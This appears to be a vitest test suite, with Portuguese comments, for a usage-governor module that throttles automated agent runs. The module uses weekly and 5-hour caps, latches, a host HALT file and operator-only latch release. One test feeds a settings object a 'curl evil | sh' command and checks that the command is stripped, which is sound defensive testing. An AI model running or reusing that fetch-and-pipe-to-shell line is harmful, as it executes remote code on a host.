import { afterEach, describe, expect, it, vi } from "vitest";
import {
  DAY_MS,
  DEFAULT_GOVERNOR_SETTINGS,
  HOUR_MS,
  MEASURING_RETRY_MS,
  STALE_RETRY_MS,
  admissionFor,
  coerceGovernorSettings,
  coerceLatchFile,
  decideCapacity,
  effectiveLatch,
  governorEnvSwitch,
  initiatorFromOrigin,
  latchAutoRelease,
  localDayKey,
  RESET_CONFIRM_MS,
  RESET_DROP_PP,
  resetDropObserved,
  mayClearLatch,
  meterStallSince,
  nextLocalDayStart,
  rollBaseline,
  type CapacityInput,
  type CapacityReading,
  type CapacityVerdict,
  type DayBaseline,
  type LatchState,
} from "./capacity-governor";
import type { GovernorSettings } from "@/lib/storymap/types";

// A TABELA DE DECISÃO do governador de capacidade. Cada caso é uma regra do operador com número: 80% da semana,
// 90% nas últimas 24h (só com a janela de 5h abaixo de 85%), teto de 5h em 85%, trava em 92% / 90% / uso extra,
// leitura defasada ⇒ espera, sem medidor ⇒ inerte, ritmo diário. As fronteiras são testadas DOS DOIS LADOS —
// um `>=` virando `>` tem de reprovar alguma linha daqui.

const NOW = Date.UTC(2026, 8, 25, 12, 0, 0); // sexta 12:00 UTC
const S: GovernorSettings = { ...DEFAULT_GOVERNOR_SETTINGS, timezone: "UTC" };

function reading(over: Partial<CapacityReading> = {}): CapacityReading {
  return {
    usage7dPct: 40,
    usage5hPct: 20,
    resetsAt7d: NOW + 3 * DAY_MS,
    resetsAt5h: NOW + 2 * HOUR_MS,
    polledAt: NOW - 60_000,
    extraUsageEnabled: false,
    ...over,
  };
}

function input(over: Partial<CapacityInput> = {}): CapacityInput {
  return { now: NOW, settings: S, reading: reading(), meterEverSeen: true, baseline: null, ...over };
}

/** A base do dia tomada à meia-noite e cinco (UTC) do MESMO dia, na mesma janela. */
function baseline(usage7dPct: number, over: Partial<DayBaseline> = {}): DayBaseline {
  const at = Date.UTC(2026, 8, 25, 0, 5);
  return { day: "2026-09-25", usage7dPct, at, resetsAt7d: NOW + 3 * DAY_MS, ...over };
}

afterEach(() => {
  vi.restoreAllMocks();
});

describe("decideCapacity — inércia e medidor", () => {
  it("desligado ⇒ admite INERTE (nada é governado)", () => {
    const v = decideCapacity(input({ settings: { ...S, enabled: false }, reading: reading({ usage7dPct: 99 }) }));
    expect(v).toMatchObject({ kind: "admit", inert: "disabled" });
  });

  it("sem medidor NUNCA visto ⇒ admite INERTE (quem adota sem proxy não trava para sempre)", () => {
    const v = decideCapacity(input({ reading: null, meterEverSeen: false }));
    expect(v).toMatchObject({ kind: "admit", inert: "no-meter" });
  });

  it("primeira leitura em voo ⇒ espera CURTA (measuring), não inerte", () => {
    const v = decideCapacity(input({ reading: null, meterEverSeen: false, meterPending: true }));
    expect(v).toEqual({ kind: "hold", reason: "measuring", detail: expect.any(String), retryAt: NOW + MEASURING_RETRY_MS });
  });

  it("medidor que JÁ EXISTIU e sumiu ⇒ espera (defasado) — fail-closed, não inerte", () => {
    const v = decideCapacity(input({ reading: null, meterEverSeen: true }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale", retryAt: NOW + STALE_RETRY_MS });
  });
});

describe("decideCapacity — leitura defasada", () => {
  it("mais velha que staleMinutes ⇒ espera; exatamente no limite ainda vale", () => {
    const velha = decideCapacity(input({ reading: reading({ polledAt: NOW - 20 * 60_000 - 1 }) }));
    expect(velha).toMatchObject({ kind: "hold", reason: "stale" });
    const noLimite = decideCapacity(input({ reading: reading({ polledAt: NOW - 20 * 60_000 }) }));
    expect(noLimite.kind).toBe("admit");
  });

  it("defasada VENCE a trava: um 99% de ontem não engata nada, só espera o número novo", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 99, polledAt: NOW - 3 * HOUR_MS }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale" });
  });

  it("uma leitura cuja janela semanal já virou é defasada", () => {
    const v = decideCapacity(input({ reading: reading({ resetsAt7d: NOW - 1 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale" });
  });

  it("staleMinutes configurável", () => {
    const v = decideCapacity(input({ settings: { ...S, staleMinutes: 5 }, reading: reading({ polledAt: NOW - 6 * 60_000 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale" });
  });
});

describe("decideCapacity — a trava automática", () => {
  it("uso extra (pago) ligado ⇒ trava, com a janela folgada", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 5, extraUsageEnabled: true }) }));
    expect(v).toMatchObject({ kind: "latch", reason: "extra-usage" });
  });

  it("7d ≥ 92 ⇒ trava; 91.9 ⇒ não trava (fica no teto semanal)", () => {
    expect(decideCapacity(input({ reading: reading({ usage7dPct: 92 }) }))).toMatchObject({ kind: "latch", reason: "week" });
    expect(decideCapacity(input({ reading: reading({ usage7dPct: 91.9 }) }))).toMatchObject({ kind: "hold", reason: "week-cap" });
  });

  it("5h ≥ 90 ⇒ trava; 89.9 ⇒ só o teto de 5h", () => {
    expect(decideCapacity(input({ reading: reading({ usage5hPct: 90 }) }))).toMatchObject({ kind: "latch", reason: "five-hour" });
    expect(decideCapacity(input({ reading: reading({ usage5hPct: 89.9 }) }))).toMatchObject({ kind: "hold", reason: "five-hour" });
  });
});

describe("decideCapacity — o teto de 5h", () => {
  it("5h ≥ 85 ⇒ espera até o reset da janela curta; 84.9 ⇒ admite", () => {
    const v = decideCapacity(input({ reading: reading({ usage5hPct: 85 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "five-hour", retryAt: NOW + 2 * HOUR_MS });
    expect(decideCapacity(input({ reading: reading({ usage5hPct: 84.9 }) })).kind).toBe("admit");
  });

  it("sem reset conhecido da janela curta, re-tenta em meia hora", () => {
    const v = decideCapacity(input({ reading: reading({ usage5hPct: 86, resetsAt5h: null }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "five-hour", retryAt: NOW + 30 * 60_000 });
  });

  it("5h desconhecida (medidor sem a janela curta) não bloqueia", () => {
    expect(decideCapacity(input({ reading: reading({ usage5hPct: null }) })).kind).toBe("admit");
  });
});

describe("decideCapacity — o teto semanal e as últimas 24h", () => {
  it("7d = 80 com 3 dias pela frente ⇒ espera a ABERTURA das últimas 24h (quando o teto sobe)", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 80 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "week-cap", retryAt: NOW + 3 * DAY_MS - DAY_MS });
  });

  it("7d = 79.9 com a base do dia igual ⇒ admite (ainda cabe)", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 79.9 }), baseline: baseline(79.9) }));
    expect(v.kind).toBe("admit");
  });

  it("últimas 24h com 5h folgada: o teto vira 90 — 85 admite, 90 espera o RESET", () => {
    const r = { resetsAt7d: NOW + 20 * HOUR_MS, usage5hPct: 50 };
    const b = baseline(85, { resetsAt7d: NOW + 20 * HOUR_MS });
    const ok = decideCapacity(input({ reading: reading({ ...r, usage7dPct: 85 }), baseline: b }));
    expect(ok.kind).toBe("admit");
    expect(ok.kind === "admit" && ok.pacing?.ceilingPct).toBe(90);
    const cheio = decideCapacity(input({ reading: reading({ ...r, usage7dPct: 90 }), baseline: b }));
    expect(cheio).toMatchObject({ kind: "hold", reason: "week-cap", retryAt: NOW + 20 * HOUR_MS });
  });

  it("últimas 24h com a 5h NO TETO: o 90 não abre — o automático espera a janela curta", () => {
    const v = decideCapacity(input({ reading: reading({ resetsAt7d: NOW + 20 * HOUR_MS, usage7dPct: 82, usage5hPct: 85 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "five-hour" });
    expect(v.kind === "hold" && v.pacing?.ceilingPct).toBe(80);
  });

  it("exatamente 24h antes do reset já é 'últimas 24h'", () => {
    const v = decideCapacity(input({ reading: reading({ resetsAt7d: NOW + DAY_MS, usage7dPct: 85 }), baseline: baseline(85, { resetsAt7d: NOW + DAY_MS }) }));
    expect(v.kind).toBe("admit");
  });
});

describe("decideCapacity — o ritmo diário", () => {
  // Base 40 à 00:05, reset 3d+12h depois da base ⇒ (80 − 40) ÷ ~3.5 ≈ 11.4 pp para hoje.
  const b = baseline(40);
  const cota = (80 - 40) / ((b.resetsAt7d - b.at) / DAY_MS);

  it("abaixo da cota ⇒ admite; NA cota ⇒ espera a virada do dia local", () => {
    expect(decideCapacity(input({ reading: reading({ usage7dPct: 40 + cota - 0.1 }), baseline: b })).kind).toBe("admit");
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 40 + cota }), baseline: b }));
    expect(v).toMatchObject({ kind: "hold", reason: "daily-allowance", retryAt: Date.UTC(2026, 8, 26, 0, 0) });
    expect(v.kind === "hold" && v.pacing?.allowancePct).toBeCloseTo(cota, 5);
  });

  it("o gasto conta o uso TOTAL (dono + frota): a subida da janela desde a 1ª leitura do dia", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 55 }), baseline: b }));
    expect(v).toMatchObject({ kind: "hold", reason: "daily-allowance" });
    expect(v.kind === "hold" && v.pacing?.usedTodayPct).toBe(15);
  });

  it("`dailyPacing: false` desliga SÓ o ritmo diário — os tetos e a trava continuam valendo", () => {
    // O caso: o dono quer a automação andando JÁ, mesmo com o gasto do dia acima da cota do dia. Sem ritmo
    // diário, o que segura é o teto (e a trava) que ele declarou.
    const semRitmo = { ...S, dailyPacing: false };
    expect(decideCapacity(input({ settings: semRitmo, reading: reading({ usage7dPct: 55 }), baseline: b })).kind).toBe("admit");
    expect(decideCapacity(input({ settings: semRitmo, reading: reading({ usage7dPct: 80 }), baseline: b }))).toMatchObject({
      kind: "hold",
      reason: "week-cap",
    });
    expect(decideCapacity(input({ settings: semRitmo, reading: reading({ usage7dPct: 92 }), baseline: b }))).toMatchObject({
      kind: "latch",
    });
    // o default segue com o ritmo ligado
    expect(decideCapacity(input({ reading: reading({ usage7dPct: 55 }), baseline: b }))).toMatchObject({ reason: "daily-allowance" });
  });

  it("base de OUTRO dia ⇒ esta leitura é a primeira de hoje (gasto 0, admite)", () => {
    const ontem = baseline(20, { day: "2026-09-24", at: Date.UTC(2026, 8, 24, 0, 5) });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 60 }), baseline: ontem }));
    expect(v.kind).toBe("admit");
    expect(v.kind === "admit" && v.pacing?.baselinePct).toBe(60);
  });

  it("base de OUTRA janela semanal (o reset aconteceu hoje) ⇒ base nova", () => {
    const janelaVelha = baseline(78, { resetsAt7d: NOW - 2 * HOUR_MS });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 3 }), baseline: janelaVelha }));
    expect(v.kind).toBe("admit");
    expect(v.kind === "admit" && v.pacing?.baselinePct).toBe(3);
  });

  it("no último dia a cota é TODO o espaço até o teto (divide por no mínimo 1 dia)", () => {
    const r = NOW + 10 * HOUR_MS;
    const bUltimo = baseline(60, { resetsAt7d: r, at: NOW - 2 * HOUR_MS });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 60, resetsAt7d: r, usage5hPct: 10 }), baseline: bUltimo }));
    expect(v.kind === "admit" && v.pacing?.allowancePct).toBe(30); // (90 − 60) ÷ 1
  });

  it("re-tenta no PRIMEIRO de: virada do dia, abertura das últimas 24h, reset", () => {
    // reset em 30h ⇒ as últimas 24h abrem em 6h, antes da meia-noite (12h).
    const r = NOW + 30 * HOUR_MS;
    const bb = baseline(40, { resetsAt7d: r });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 79, resetsAt7d: r }), baseline: bb }));
    expect(v).toMatchObject({ kind: "hold", reason: "daily-allowance", retryAt: NOW + 6 * HOUR_MS });
  });
});

describe("rollBaseline", () => {
  it("mantém a base do mesmo dia e janela; troca de dia ou de janela troca a base", () => {
    const b = baseline(40);
    expect(rollBaseline(b, reading({ usage7dPct: 50 }), NOW, "UTC")).toBe(b);
    // o resets_at do proxy oscila em segundos entre polls: ainda é a MESMA janela
    expect(rollBaseline(b, reading({ usage7dPct: 50, resetsAt7d: b.resetsAt7d + 1_000 }), NOW, "UTC")).toBe(b);
    // uma leitura ABAIXO da base re-ancora para baixo (mesmo dia, mesma janela, mesmo `at`)
    expect(rollBaseline(b, reading({ usage7dPct: 35 }), NOW, "UTC")).toEqual({ ...b, usage7dPct: 35 });
    const amanha = NOW + DAY_MS;
    expect(rollBaseline(b, reading({ usage7dPct: 50 }), amanha, "UTC")).toMatchObject({ day: "2026-09-26", usage7dPct: 50, at: amanha });
  });
});

describe("o dia LOCAL (fuso configurável)", () => {
  it("o mesmo instante é dias diferentes em fusos diferentes", () => {
    const t = Date.UTC(2026, 8, 24, 16, 0); // 01:00 do dia 25 em Tóquio (UTC+9)
    expect(localDayKey(t, "UTC")).toBe("2026-09-24");
    expect(localDayKey(t, "Asia/Tokyo")).toBe("2026-09-25");
    expect(nextLocalDayStart(t, "Asia/Tokyo")).toBe(Date.UTC(2026, 8, 25, 15, 0));
  });

  it("dia de 25h (fim do horário de verão europeu): a próxima meia-noite é a CERTA", () => {
    // 2026-10-25 00:30Z = 02:30 CEST, antes de o relógio voltar às 03:00 CEST ⇒ a meia-noite é 23:00Z (CET).
    expect(nextLocalDayStart(Date.UTC(2026, 9, 25, 0, 30), "Europe/Berlin")).toBe(Date.UTC(2026, 9, 25, 23, 0));
  });

  it("dia de 23h (início do horário de verão europeu)", () => {
    // 2026-03-29 00:30Z = 01:30 CET; às 02:00 o relógio pula para 03:00 CEST ⇒ meia-noite é 22:00Z.
    expect(nextLocalDayStart(Date.UTC(2026, 2, 29, 0, 30), "Europe/Berlin")).toBe(Date.UTC(2026, 2, 29, 22, 0));
  });
});

describe("initiatorFromOrigin — quem iniciou", () => {
  it("só `manual` fora de um ator escopado é operador; o resto é automação", () => {
    expect(initiatorFromOrigin("manual", false)).toBe("operator");
    expect(initiatorFromOrigin("manual", true)).toBe("automation"); // o copiloto pelo token escopado
    expect(initiatorFromOrigin("autorun", false)).toBe("automation");
    expect(initiatorFromOrigin("conflict-redrive", false)).toBe("automation");
    expect(initiatorFromOrigin(undefined, false)).toBe("automation"); // o default do engine é autorun
  });
});

describe("admissionFor — o operador nunca espera", () => {
  const hold = decideCapacity(input({ reading: reading({ usage7dPct: 85 }) }));
  const trava = decideCapacity(input({ reading: reading({ usage7dPct: 95 }) }));
  const halt = effectiveLatch(null, { path: "/etc/agileharness/HALT", at: NOW });

  it("operador passa por espera, trava automática e HALT", () => {
    for (const [v, l] of [[hold, null], [trava, null], [hold, halt]] as const) {
      expect(admissionFor("operator", v, l)).toMatchObject({ admit: true, reason: "operator" });
    }
  });

  it("automação: HALT/trava ⇒ espera sem prazo; hold ⇒ espera com prazo; inerte ⇒ passa", () => {
    expect(admissionFor("automation", decideCapacity(input()), halt)).toMatchObject({ admit: false, reason: "latch", retryAt: null });
    expect(admissionFor("automation", trava, null)).toMatchObject({ admit: false, reason: "auto-latch", retryAt: null });
    expect(admissionFor("automation", hold, null)).toMatchObject({ admit: false, reason: "week-cap", retryAt: NOW + 2 * DAY_MS });
    const inerte = decideCapacity(input({ reading: null, meterEverSeen: false }));
    expect(admissionFor("automation", inerte, null)).toMatchObject({ admit: true, reason: "inert" });
    expect(admissionFor("automation", decideCapacity(input()), null)).toMatchObject({ admit: true, reason: "admit" });
  });
});

describe("a trava — arquivo, HALT e quem solta", () => {
  it("latch.json ausente ⇒ sem trava; malformado ⇒ trava DURA (fail-closed); válido ⇒ o que diz", () => {
    expect(coerceLatchFile(undefined, false, NOW)).toBeNull();
    expect(coerceLatchFile("lixo", true, NOW)).toMatchObject({ level: "hard" });
    expect(coerceLatchFile({ level: "gigante", reason: "x" }, true, NOW)).toMatchObject({ level: "hard" });
    expect(coerceLatchFile({ level: "soft", reason: "7d 93%", at: 5, trippedBy: "auto:week" }, true, NOW)).toEqual({
      level: "soft",
      reason: "7d 93%",
      at: 5,
      trippedBy: "auto:week",
    });
  });

  it("HALT do host vence o arquivo e é sempre `hard`", () => {
    const f = { level: "soft" as const, reason: "x", at: 1, trippedBy: "operator" };
    expect(effectiveLatch(f, { path: "/h", at: 9 })).toMatchObject({ level: "hard", source: "halt", at: 9 });
    expect(effectiveLatch(f, null)).toMatchObject({ level: "soft", source: "file" });
    expect(effectiveLatch(null, null)).toBeNull();
  });

  it("só o operador COM SESSÃO e com motivo solta a trava — nunca um token MCP, nem o próprio serviço", () => {
    expect(mayClearLatch("operator-session", "semana nova, liberar")).toEqual({ ok: true });
    expect(mayClearLatch("mcp-token", "liberar")).toMatchObject({ ok: false });
    expect(mayClearLatch("in-process", "liberar")).toMatchObject({ ok: false });
    expect(mayClearLatch("operator-session", "  ")).toMatchObject({ ok: false });
  });
});

// A SOLTURA AUTOMÁTICA. Uma trava que a MEDIÇÃO engatou (semana/5h) é um estado DERIVADO de um número — quando a
// janela que a engatou acaba e uma leitura FRESCA da janela nova a desmente, mantê-la exige um clique humano por
// nada (num caso real: a semana virou, o uso foi a 0%, e a fila ficou retida esperando
// um operador que não tinha como saber). O que NÃO pode sair sozinho é tudo que uma PESSOA ou o DINHEIRO engatou.
describe("latchAutoRelease — só a trava da medição, só com a janela nova provada por leitura fresca", () => {
  const WEEK = 7 * DAY_MS;
  const latchAt = NOW - 10 * HOUR_MS;
  const engaged = (over: Partial<LatchState> = {}): LatchState => ({
    level: "soft",
    reason: "janela de 7 dias em 95% (trava em 95%)",
    at: latchAt,
    trippedBy: "auto:week",
    ...over,
  });
  // a janela NOVA: o reset que a leitura traz está 7d adiante, logo ela COMEÇOU depois do engate
  const rolled = reading({ usage7dPct: 0, usage5hPct: 0, resetsAt7d: NOW + WEEK - 2 * HOUR_MS, resetsAt5h: NOW + 3 * HOUR_MS });
  const admit: CapacityVerdict = { kind: "admit", detail: "dentro dos tetos" };
  const base = { latch: engaged() as LatchState | null, haltPresent: false, reading: rolled as CapacityReading | null, fresh: true, verdict: admit };
  const CAPS95 = { latchWeekPct: 95, latchFiveHourPct: 90 };

  it("semana virou + leitura fresca + a condição sumiu ⇒ solta, dizendo por quê", () => {
    const r = latchAutoRelease({ ...base });
    expect(r).toMatchObject({ release: true });
    expect((r as { reason: string }).reason).toMatch(/janela de 7 dias/i);
  });

  it("FRONTEIRA da janela: a nova só vale se COMEÇOU depois do engate (nem antes, nem no mesmo instante)", () => {
    // a janela que contém o engate começou ANTES dele ⇒ é a mesma janela
    const same = reading({ usage7dPct: 10, resetsAt7d: latchAt + WEEK - HOUR_MS });
    expect(latchAutoRelease({ ...base, reading: same })).toMatchObject({ release: false });
    // começou exatamente no instante do engate ⇒ ainda não é posterior
    const equal = reading({ usage7dPct: 10, resetsAt7d: latchAt + WEEK });
    expect(latchAutoRelease({ ...base, reading: equal })).toMatchObject({ release: false });
    // começou 1 ms depois ⇒ janela nova
    const after = reading({ usage7dPct: 10, resetsAt7d: latchAt + WEEK + 1 });
    expect(latchAutoRelease({ ...base, reading: after })).toMatchObject({ release: true });
  });

  it("MESMA janela com o número só UM POUCO abaixo do teto não solta (o dono subiu o teto: soltar é gesto dele)", () => {
    const sameWindow = reading({ usage7dPct: 60, resetsAt7d: latchAt + WEEK - 3 * DAY_MS });
    expect(latchAutoRelease({ ...base, reading: sameWindow })).toMatchObject({ release: false });
    // nem com os tetos e uma "queda" antiga: 60% não está RESET_DROP_PP abaixo de 95%
    expect(latchAutoRelease({ ...base, reading: sameWindow, caps: CAPS95, resetDropSince: NOW - DAY_MS })).toMatchObject({ release: false });
  });

  // Regressão (caso real): o dono ZEROU a cota na conta; o reset da semana ficou onde estava, o uso foi a 6%, e a trava
  // seguiu dizendo «95%» até um clique — a regra só conhecia a janela nova.
  describe("cota ZERADA na mesma janela", () => {
    const sameWeekReset = latchAt + WEEK - 3 * DAY_MS;
    const zeroed = reading({ usage7dPct: 6, resetsAt7d: sameWeekReset, polledAt: NOW - 60_000 });

    it("queda grande SUSTENTADA por RESET_CONFIRM_MS ⇒ solta, dizendo que a cota foi zerada", () => {
      const r = latchAutoRelease({ ...base, reading: zeroed, caps: CAPS95, resetDropSince: zeroed.polledAt - RESET_CONFIRM_MS });
      expect(r).toMatchObject({ release: true });
      expect((r as { reason: string }).reason).toMatch(/cota de 7 dias foi zerada/);
    });

    it("a 1ª leitura da queda (ou menos de RESET_CONFIRM_MS dela) só CONFIRMA, não solta", () => {
      expect(latchAutoRelease({ ...base, reading: zeroed, caps: CAPS95, resetDropSince: zeroed.polledAt })).toMatchObject({
        release: false,
        why: expect.stringMatching(/confirmando/),
      });
      expect(
        latchAutoRelease({ ...base, reading: zeroed, caps: CAPS95, resetDropSince: zeroed.polledAt - RESET_CONFIRM_MS + 1 }),
      ).toMatchObject({ release: false });
      expect(latchAutoRelease({ ...base, reading: zeroed, caps: CAPS95, resetDropSince: null })).toMatchObject({ release: false });
    });

    it("sem os tetos (chamador antigo) a regra da cota zerada não vale — só a janela nova solta", () => {
      expect(latchAutoRelease({ ...base, reading: zeroed, resetDropSince: NOW - DAY_MS })).toMatchObject({ release: false });
    });

    it("FRONTEIRA da queda: exatamente RESET_DROP_PP abaixo do teto conta; 1 ponto acima não", () => {
      const latch = engaged();
      expect(resetDropObserved(latch, reading({ usage7dPct: 95 - RESET_DROP_PP }), CAPS95)).toBe(true);
      expect(resetDropObserved(latch, reading({ usage7dPct: 95 - RESET_DROP_PP + 1 }), CAPS95)).toBe(false);
    });

    it("leitura ANTERIOR ao engate não prova nada; trava que não é da medição (ou dura) nunca conta", () => {
      expect(resetDropObserved(engaged(), reading({ usage7dPct: 0, polledAt: latchAt }), CAPS95)).toBe(false);
      expect(resetDropObserved(engaged({ trippedBy: "operator" }), reading({ usage7dPct: 0 }), CAPS95)).toBe(false);
      expect(resetDropObserved(engaged({ trippedBy: "auto:extra-usage" }), reading({ usage7dPct: 0 }), CAPS95)).toBe(false);
      expect(resetDropObserved(engaged({ level: "hard" }), reading({ usage7dPct: 0 }), CAPS95)).toBe(false);
    });

    it("a trava de 5h segue a mesma régua, pelo número de 5h", () => {
      const five = engaged({ trippedBy: "auto:five-hour", reason: "janela de 5 horas em 90%" });
      const sameFive = reading({ usage5hPct: 4, resetsAt5h: latchAt + 2 * HOUR_MS });
      const r = latchAutoRelease({ ...base, latch: five, reading: sameFive, caps: CAPS95, resetDropSince: sameFive.polledAt - RESET_CONFIRM_MS });
      expect(r).toMatchObject({ release: true });
      expect((r as { reason: string }).reason).toMatch(/cota de 5h foi zerada/);
      expect(resetDropObserved(five, reading({ usage5hPct: null }), CAPS95)).toBe(false);
    });
  });

  it("leitura defasada ou ausente ⇒ não solta (sem prova, a trava fica)", () => {
    expect(latchAutoRelease({ ...base, fresh: false })).toMatchObject({ release: false });
    expect(latchAutoRelease({ ...base, reading: null })).toMatchObject({ release: false });
  });

  it("a condição AINDA viva na janela nova (já estourou de novo) ⇒ não solta", () => {
    expect(latchAutoRelease({ ...base, verdict: { kind: "latch", reason: "week", detail: "janela de 7 dias em 96%" } })).toMatchObject({ release: false });
  });

  it("a janela de 5h segue a mesma regra, pelo reset de 5h", () => {
    const five = engaged({ trippedBy: "auto:five-hour", reason: "janela de 5 horas em 90%" });
    const newFive = reading({ usage5hPct: 3, resetsAt5h: latchAt + 5 * HOUR_MS + 1, resetsAt7d: NOW + 3 * DAY_MS });
    expect(latchAutoRelease({ ...base, latch: five, reading: newFive })).toMatchObject({ release: true });
    const sameFive = reading({ usage5hPct: 3, resetsAt5h: latchAt + 2 * HOUR_MS });
    expect(latchAutoRelease({ ...base, latch: five, reading: sameFive })).toMatchObject({ release: false });
    // sem o reset de 5h na leitura não há como provar a janela nova
    expect(latchAutoRelease({ ...base, latch: five, reading: reading({ resetsAt5h: null }) })).toMatchObject({ release: false });
  });

  it.each([
    ["uso extra PAGO (dinheiro é do dono)", engaged({ trippedBy: "auto:extra-usage", reason: "uso extra ligado" })],
    ["engatada pelo operador", engaged({ trippedBy: "operator" })],
    ["engatada por um agente via MCP", engaged({ trippedBy: "mcp:orch" })],
    ["origem desconhecida", engaged({ trippedBy: "unknown" })],
    ["dura, mesmo que automática", engaged({ level: "hard" })],
  ])("NUNCA solta sozinha: %s", (_nome, latch) => {
    expect(latchAutoRelease({ ...base, latch })).toMatchObject({ release: false });
  });

  it("o HALT do host vale sempre; sem trava não há o que soltar", () => {
    expect(latchAutoRelease({ ...base, haltPresent: true })).toMatchObject({ release: false });
    expect(latchAutoRelease({ ...base, latch: null })).toMatchObject({ release: false });
  });
});

describe("coerceGovernorSettings — fail-closed por campo, sem spread", () => {
  it("ausente ⇒ os defaults do dono", () => {
    expect(coerceGovernorSettings(undefined)).toEqual({ ...DEFAULT_GOVERNOR_SETTINGS });
  });

  it("`dailyPacing`: só `false` desliga o ritmo; ausente fica fora do objeto (ritmo ligado); lixo cai no default COM aviso", () => {
    expect(coerceGovernorSettings({ dailyPacing: false })).toMatchObject({ dailyPacing: false });
    expect(coerceGovernorSettings({ dailyPacing: true })).not.toHaveProperty("dailyPacing");
    expect(coerceGovernorSettings({})).not.toHaveProperty("dailyPacing");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(coerceGovernorSettings({ dailyPacing: "no" })).not.toHaveProperty("dailyPacing");
    expect(warn.mock.calls.some((c) => String(c[0]).includes("dailyPacing"))).toBe(true);
    warn.mockRestore();
  });

  it("valores válidos entram; chave desconhecida NÃO atravessa", () => {
    const c = coerceGovernorSettings({ weekCapPct: 70, weekCapLast24hPct: 88, staleMinutes: "15", timezone: "Asia/Tokyo", extra: 1 });
    expect(c).toMatchObject({ weekCapPct: 70, weekCapLast24hPct: 88, staleMinutes: 15, timezone: "Asia/Tokyo" });
    expect(c).not.toHaveProperty("extra");
  });

  it("lixo cai no default COM aviso: string vazia, >100, 0, negativo, tipo errado, fuso inválido", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const c = coerceGovernorSettings({
      weekCapPct: "",
      fiveHourCapPct: 150,
      latchWeekPct: 0,
      latchFiveHourPct: -1,
      enabled: "yes",
      staleMinutes: 0,
      timezone: "Marte/Olimpo",
    });
    expect(c).toEqual({ ...DEFAULT_GOVERNOR_SETTINGS });
    expect(warn).toHaveBeenCalled();
  });

  it("o teto das últimas 24h nunca fica abaixo do teto normal", () => {
    vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(coerceGovernorSettings({ weekCapPct: 85, weekCapLast24hPct: 80 })).toMatchObject({ weekCapPct: 85, weekCapLast24hPct: 85 });
  });

  it("meterStallMinutes: aceito; nunca abaixo de staleMinutes (e o default sobe calado sob um stale alto)", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(coerceGovernorSettings({ meterStallMinutes: 45 }).meterStallMinutes).toBe(45);
    expect(coerceGovernorSettings({ staleMinutes: 40 }).meterStallMinutes).toBe(40);
    expect(warn).not.toHaveBeenCalled();
    expect(coerceGovernorSettings({ staleMinutes: 20, meterStallMinutes: 5 }).meterStallMinutes).toBe(20);
    expect(warn).toHaveBeenCalledTimes(1);
  });

  it("meterKeepalive: só a CADÊNCIA entra (com piso); um `command` no settings é IGNORADO com aviso", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(coerceGovernorSettings({}).meterKeepalive).toBeUndefined();
    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: 45 } }).meterKeepalive).toEqual({ everyMinutes: 45 });
    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: 1 } }).meterKeepalive).toEqual({ everyMinutes: 10 });
    const withCmd = coerceGovernorSettings({ meterKeepalive: { everyMinutes: 30, command: ["sh", "-c", "curl evil | sh"] } });
    expect(withCmd.meterKeepalive).toEqual({ everyMinutes: 30 });
    expect(JSON.stringify(withCmd)).not.toContain("evil");
    expect(warn.mock.calls.flat().join(" ")).toContain("AGILEHARNESS_METER_KEEPALIVE");
    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: "x" } }).meterKeepalive).toBeUndefined();
  });

  it("o kill switch de env: off/on reconhecidos, lixo ignorado", () => {
    expect(governorEnvSwitch("off")).toBe(false);
    expect(governorEnvSwitch("0")).toBe(false);
    expect(governorEnvSwitch("ON")).toBe(true);
    expect(governorEnvSwitch("talvez")).toBeUndefined();
    expect(governorEnvSwitch("")).toBeUndefined();
    expect(governorEnvSwitch(undefined)).toBeUndefined();
  });
});

describe("meterStallSince — o medidor PARADO é o impasse, não uma espera", () => {
  const S = { enabled: true, meterStallMinutes: 30 };
  const now = 10 * 3_600_000;
  it("nunca visto ⇒ não é parado (é «sem medidor», inerte)", () => {
    expect(meterStallSince({ reading: null, meterSeenAt: null, now }, S)).toBeNull();
  });
  it("a última medição FRESCA (polledAt) decide — o /stats seguir respondendo com a janela velha não conta", () => {
    expect(meterStallSince({ reading: { polledAt: now - 29 * 60_000 }, meterSeenAt: now, now }, S)).toBeNull();
    expect(meterStallSince({ reading: { polledAt: now - 31 * 60_000 }, meterSeenAt: now, now }, S)).toBe(now - 31 * 60_000);
  });
  it("sem leitura nenhuma, conta desde a última vez que o medidor foi visto; desligado ⇒ nunca", () => {
    expect(meterStallSince({ reading: null, meterSeenAt: now - 60 * 60_000, now }, S)).toBe(now - 60 * 60_000);
    expect(meterStallSince({ reading: null, meterSeenAt: now - 60 * 60_000, now }, { ...S, enabled: false })).toBeNull();
  });
});
